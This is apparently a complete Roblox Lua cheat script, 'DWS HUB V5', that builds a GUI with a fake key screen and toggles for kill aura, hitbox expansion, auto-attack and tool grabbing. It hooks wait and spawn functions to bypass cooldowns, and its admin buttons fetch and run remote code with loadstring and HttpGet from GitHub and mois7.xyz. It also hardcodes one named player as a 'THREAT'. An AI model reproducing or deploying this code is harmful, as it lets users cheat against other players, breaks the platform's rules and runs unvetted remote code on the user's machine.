-- ==============================================================================
-- ⚡ DWS HUB V5 (PREMIUM DASHBOARD EDITION)
-- ALL MODULES INTEGRATED | CUSTOM TOGGLES | THREAT DETECTION | KEY SYSTEM
-- ==============================================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UIS = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- ==============================================================================
-- 🎨 THEME & FACTORY ENGINE
-- ==============================================================================
local Theme = {
Bg = Color3.fromRGB(15, 15, 18),
Card = Color3.fromRGB(22, 22, 28),
Text = Color3.fromRGB(240, 240, 245),
Muted = Color3.fromRGB(120, 120, 130),
Primary = Color3.fromRGB(45, 120, 255),
Success = Color3.fromRGB(45, 200, 80),
Danger = Color3.fromRGB(255, 60, 60),
ToggleOff = Color3.fromRGB(60, 60, 70),
ToggleOn = Color3.fromRGB(45, 200, 80)
}

if CoreGui:FindFirstChild("DWS_Premium") then CoreGui.DWS_Premium:Destroy() end
local UI = Instance.new("ScreenGui", CoreGui)
UI.Name = "DWS_Premium"
UI.ResetOnSpawn = false

local function Create(class, props, parent)
local obj = Instance.new(class)
for i, v in pairs(props) do obj[i] = v end
if parent then obj.Parent = parent end
return obj
end

local function Round(obj, rad) Create("UICorner", {CornerRadius = UDim.new(0, rad)}, obj) end
local function Stroke(obj, color, thick) Create("UIStroke", {Color = color, Thickness = thick, Transparency = 0.2}, obj) end

-- ==============================================================================
-- 🔐 PROFESSIONAL KEY SYSTEM (Ref: images (4).jpeg)
-- ==============================================================================
local KeyOverlay = Create("Frame", {Size = UDim2.new(1,0,1,0), BackgroundColor3 = Color3.new(0,0,0), BackgroundTransparency = 0.2}, UI)
local KeyCard = Create("Frame", {Size = UDim2.new(0, 450, 0, 260), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 0), BackgroundColor3 = Theme.Card}, KeyOverlay)
Round(KeyCard, 12); Stroke(KeyCard, Theme.Primary, 1)

Create("TextLabel", {Size = UDim2.new(1,0,0,60), Text = "🛡️ Key Verification System", TextColor3 = Theme.Text, Font = Enum.Font.GothamBold, TextSize = 18, BackgroundTransparency = 1}, KeyCard)
local KeyInput = Create("TextBox", {Size = UDim2.new(0.9, 0, 0, 45), Position = UDim2.new(0.05, 0, 0.35, 0), BackgroundColor3 = Theme.Bg, TextColor3 = Theme.Text, PlaceholderText = "Enter your verification key...", Font = Enum.Font.Gotham, TextSize = 14}, KeyCard)
Round(KeyInput, 8); Stroke(KeyInput, Theme.Muted, 1)

local GetLinkBtn = Create("TextButton", {Size = UDim2.new(0.43, 0, 0, 45), Position = UDim2.new(0.05, 0, 0.65, 0), BackgroundColor3 = Theme.Primary, TextColor3 = Color3.new(1,1,1), Text = "🔗 Get Link", Font = Enum.Font.GothamBold, TextSize = 14}, KeyCard)
Round(GetLinkBtn, 8)
local VerifyBtn = Create("TextButton", {Size = UDim2.new(0.43, 0, 0, 45), Position = UDim2.new(0.52, 0, 0.65, 0), BackgroundColor3 = Theme.Success, TextColor3 = Color3.new(1,1,1), Text = "✔️ Verify Key", Font = Enum.Font.GothamBold, TextSize = 14}, KeyCard)
Round(VerifyBtn, 8)

-- ==============================================================================
-- 💻 DASHBOARD UI (Ref: b6d4f9a449bd4a36003ac5c757d4a8aa976dd3b5_2.jpeg)
-- ==============================================================================
local MainHub = Create("Frame", {Size = UDim2.new(0, 800, 0, 500), AnchorPoint = Vector2.new(0.5,0.5), Position = UDim2.new(0.5, 0, 0.5, 0), BackgroundColor3 = Theme.Bg, Visible = false}, UI)
Round(MainHub, 16); Stroke(MainHub, Theme.ToggleOff, 1)

-- Cutscene Logic
VerifyBtn.MouseButton1Click:Connect(function()
KeyCard.Visible = false
local BootText = Create("TextLabel", {Size = UDim2.new(1,0,1,0), BackgroundTransparency = 1, TextColor3 = Theme.Success, Font = Enum.Font.Code, TextSize = 18, Text = ""}, KeyOverlay)
local msg = "> INITIALIZING DWS PROTOCOL...\n> BYPASSING SECURITY...\n> ACCESS GRANTED."
for i = 1, #msg do BootText.Text = string.sub(msg, 1, i); task.wait(0.03) end
task.wait(0.5)
TweenService:Create(KeyOverlay, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
BootText:Destroy()
task.wait(0.5)
KeyOverlay.Visible = false
MainHub.Visible = true
end)

-- Draggable Logic
local dragging, dragInput, dragStart, startPos
MainHub.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
dragging = true; dragStart = input.Position; startPos = MainHub.Position
input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
end
end)
UIS.InputChanged:Connect(function(input)
if input == dragInput and dragging then
local delta = input.Position - dragStart
MainHub.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end
end)

-- ==============================================================================
-- 🧭 BOTTOM NAVIGATION DOCK
-- ==============================================================================
local Dock = Create("Frame", {Size = UDim2.new(0, 400, 0, 50), AnchorPoint = Vector2.new(0.5, 1), Position = UDim2.new(0.5, 0, 1, -15), BackgroundColor3 = Theme.Card}, MainHub)
Round(Dock, 25); Stroke(Dock, Theme.ToggleOff, 1)

local Tabs = {}
local function CreateNavBtn(icon, name, pos)
local btn = Create("TextButton", {Size = UDim2.new(0, 80, 1, 0), Position = pos, BackgroundTransparency = 1, Text = icon, TextSize = 20, Font = Enum.Font.Gotham}, Dock)
local page = Create("ScrollingFrame", {Size = UDim2.new(1, -40, 1, -90), Position = UDim2.new(0, 20, 0, 20), BackgroundTransparency = 1, Visible = false, ScrollBarThickness = 4}, MainHub)
Create("UIListLayout", {Padding = UDim.new(0, 10), SortOrder = Enum.SortOrder.LayoutOrder}, page)
Tabs[name] = page
btn.MouseButton1Click:Connect(function()
for _, t in pairs(Tabs) do t.Visible = false end
page.Visible = true
end)
return page
end

local HomeTab = CreateNavBtn("🏠", "Home", UDim2.new(0, 0, 0, 0))
local CombatTab = CreateNavBtn("⚔️", "Combat", UDim2.new(0.2, 0, 0, 0))
local UtilityTab = CreateNavBtn("⚙️", "Utility", UDim2.new(0.4, 0, 0, 0))
local AdminTab = CreateNavBtn("🛡️", "Admins", UDim2.new(0.6, 0, 0, 0))
local VegaTab = CreateNavBtn("⚡", "VegaX", UDim2.new(0.8, 0, 0, 0))
HomeTab.Visible = true

-- ==============================================================================
-- 🏠 HOME TAB (AVATAR & SERVER)
-- ==============================================================================
local ServerCard = Create("Frame", {Size = UDim2.new(0, 300, 0, 120), BackgroundColor3 = Theme.Card}, HomeTab)
Round(ServerCard, 12); Stroke(ServerCard, Theme.Primary, 1)
Create("TextLabel", {Size = UDim2.new(1, -20, 0, 30), Position = UDim2.new(0, 10, 0, 10), BackgroundTransparency = 1, Text = "Server Status", TextColor3 = Theme.Text, Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left}, ServerCard)
Create("TextLabel", {Size = UDim2.new(1, -20, 0, 20), Position = UDim2.new(0, 10, 0, 45), BackgroundTransparency = 1, Text = "Players: " .. #Players:GetPlayers(), TextColor3 = Theme.Muted, Font = Enum.Font.Gotham, TextXAlignment = Enum.TextXAlignment.Left}, ServerCard)

local UserCard = Create("Frame", {Size = UDim2.new(0, 300, 0, 100), BackgroundColor3 = Theme.Card}, HomeTab)
Round(UserCard, 12)
local Avatar = Create("ImageLabel", {Size = UDim2.new(0, 70, 0, 70), Position = UDim2.new(0, 15, 0, 15), BackgroundColor3 = Theme.Bg, Image = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)}, UserCard)
Round(Avatar, 35)
Create("TextLabel", {Size = UDim2.new(0, 150, 0, 25), Position = UDim2.new(0, 100, 0, 25), BackgroundTransparency = 1, Text = LocalPlayer.Name, TextColor3 = Theme.Text, Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left, TextSize = 18}, UserCard)

-- 🚨 THREAT LOGIC 🚨
if LocalPlayer.Name == "city800" then
local ThreatBadge = Create("TextLabel", {Size = UDim2.new(0, 80, 0, 20), Position = UDim2.new(0, 100, 0, 55), BackgroundColor3 = Color3.fromRGB(60, 10, 10), TextColor3 = Theme.Danger, Text = "⚠️ THREAT", Font = Enum.Font.GothamBold, TextSize = 12}, UserCard)
Round(ThreatBadge, 4); Stroke(ThreatBadge, Theme.Danger, 1)
end

-- ==============================================================================
-- 🔘 CIRCULAR TOGGLE BUILDER
-- ==============================================================================
local function CreateToggle(parent, title, callback)
local Card = Create("Frame", {Size = UDim2.new(1, 0, 0, 60), BackgroundColor3 = Theme.Card}, parent)
Round(Card, 10)
Create("TextLabel", {Size = UDim2.new(0.7, 0, 1, 0), Position = UDim2.new(0, 15, 0, 0), BackgroundTransparency = 1, Text = title, TextColor3 = Theme.Text, Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left}, Card)

local Pill = Create("Frame", {Size = UDim2.new(0, 50, 0, 26), AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, -15, 0.5, 0), BackgroundColor3 = Theme.ToggleOff}, Card)
Round(Pill, 13)
local Circle = Create("Frame", {Size = UDim2.new(0, 20, 0, 20), Position = UDim2.new(0, 3, 0, 3), BackgroundColor3 = Color3.new(1,1,1)}, Pill)
Round(Circle, 10)

local Btn = Create("TextButton", {Size = UDim2.new(1,0,1,0), BackgroundTransparency = 1, Text = ""}, Card)
local toggled = false

Btn.MouseButton1Click:Connect(function()
	toggled = not toggled
	TweenService:Create(Pill, TweenInfo.new(0.3), {BackgroundColor3 = toggled and Theme.ToggleOn or Theme.ToggleOff}):Play()
	TweenService:Create(Circle, TweenInfo.new(0.3), {Position = toggled and UDim2.new(1, -23, 0, 3) or UDim2.new(0, 3, 0, 3)}):Play()
	callback(toggled)
end)


end

-- ==============================================================================
-- ⚙️ SCRIPT LOGIC MAPPING
-- ==============================================================================

-- ⚔️ COMBAT TAB
local HitboxEnabled = false
CreateToggle(CombatTab, "Hitbox Expander", function(state)
HitboxEnabled = state
for _, p in ipairs(Players:GetPlayers()) do
if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
local hrp = p.Character.HumanoidRootPart
if state then
hrp.Size = Vector3.new(10, 10, 10); hrp.Transparency = 0.8; hrp.BrickColor = BrickColor.new("Royal blue"); hrp.CanCollide = false
else
hrp.Size = Vector3.new(2, 2, 1); hrp.Transparency = 1
end
end
end
end)

local HitAmpActive = false
CreateToggle(CombatTab, "Hit Amplifier", function(state) HitAmpActive = state end)
local ampParams = OverlapParams.new(); ampParams.FilterType = Enum.RaycastFilterType.Blacklist
RunService.Heartbeat:Connect(function()
if not HitAmpActive or not LocalPlayer.Character then return end
local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if hrp then
ampParams.FilterDescendantsInstances = {LocalPlayer.Character}
local parts = workspace:GetPartBoundsInBox(CFrame.new(hrp.Position), Vector3.new(28,28,28), ampParams)
for _, part in ipairs(parts) do
if part.Parent:FindFirstChildOfClass("Humanoid") then
for _, t in ipairs(LocalPlayer.Character:GetChildren()) do
if t:IsA("Tool") then pcall(t.Activate, t) end
end
break
end
end
end
end)

local AuraActive = false
CreateToggle(CombatTab, "Kill Aura", function(state) AuraActive = state end)
RunService.Heartbeat:Connect(function()
if not AuraActive or not LocalPlayer.Character then return end
local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if not myHRP then return end
for _, p in ipairs(Players:GetPlayers()) do
if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
if (p.Character.HumanoidRootPart.Position - myHRP.Position).Magnitude <= 35 then
for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do
if tool:IsA("Tool") then
local touch = tool:FindFirstChildWhichIsA("TouchTransmitter", true)
if touch and touch.Parent then
firetouchinterest(touch.Parent, p.Character.HumanoidRootPart, 0)
firetouchinterest(touch.Parent, p.Character.HumanoidRootPart, 1)
end
end
end
end
end
end
end)

-- 🛠️ UTILITY TAB
local ToolGrabberActive = false
CreateToggle(UtilityTab, "Instant Tool Grabber", function(state) ToolGrabberActive = state end)
RunService.Heartbeat:Connect(function()
if not ToolGrabberActive or not LocalPlayer.Character then return end
local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if not root then return end
for _, d in ipairs(workspace:GetDescendants()) do
if d:IsA("TouchTransmitter") and d.Parent and d.Parent.Parent and d.Parent.Parent.Name:find("GearGiver") then
if (d.Parent.Position - root.Position).Magnitude < 1000 then
firetouchinterest(root, d.Parent, 0)
firetouchinterest(root, d.Parent, 1)
end
end
end
end)

local UseToolsActive = false
CreateToggle(UtilityTab, "Use Tools (Auto-Equip/Use)", function(state) UseToolsActive = state end)
RunService.Heartbeat:Connect(function()
if not UseToolsActive or not LocalPlayer.Character then return end
for _, t in ipairs(LocalPlayer.Backpack:GetChildren()) do if t:IsA("Tool") then t.Parent = LocalPlayer.Character end end
for _, t in ipairs(LocalPlayer.Character:GetChildren()) do if t:IsA("Tool") then pcall(t.Activate, t) end end
end)

local RespawnActive = false
local diedConn
CreateToggle(UtilityTab, "Quantum Respawn", function(state)
RespawnActive = state
if state and LocalPlayer.Character then
local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
if hum then
diedConn = hum.HealthChanged:Connect(function(hp)
if hp <= 0 and RespawnActive then game:GetService("ReplicatedStorage"):FindFirstChild("Guide"):FireServer() end
end)
end
elseif diedConn then diedConn:Disconnect() end
end)

-- 🛡️ ADMINS TAB
local function CreateButton(parent, text, callback)
local Card = Create("Frame", {Size = UDim2.new(1, 0, 0, 50), BackgroundColor3 = Theme.Card}, parent)
Round(Card, 8)
local Btn = Create("TextButton", {Size = UDim2.new(1,0,1,0), BackgroundTransparency = 1, Text = text, TextColor3 = Theme.Text, Font = Enum.Font.GothamBold}, Card)
Btn.MouseButton1Click:Connect(callback)
end

CreateButton(AdminTab, "Execute Nameless Admin", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
end)

CreateButton(AdminTab, "Execute M7 Admin", function()
loadstring(game:HttpGet("https://mois7.xyz/loader"))()
end)

-- ⚡ VEGA X TAB (NO COOLDOWN ENGINE)
local CooldownBypassed = false
CreateToggle(VegaTab, "Vega X: No Cooldown Engine", function(state)
if state and not CooldownBypassed then
CooldownBypassed = true
local instant = function() return RunService.PostSimulation:Wait() end
hookfunction(wait, instant)
hookfunction(task.wait, instant)
hookfunction(delay, function(_,f) task.spawn(f) end)
hookfunction(spawn, function(f) task.spawn(f) end)
print("⚡ Vega X No Cooldown Enabled")
end
end)

print("⚡ DWS HUB V5 Loaded Successfully")
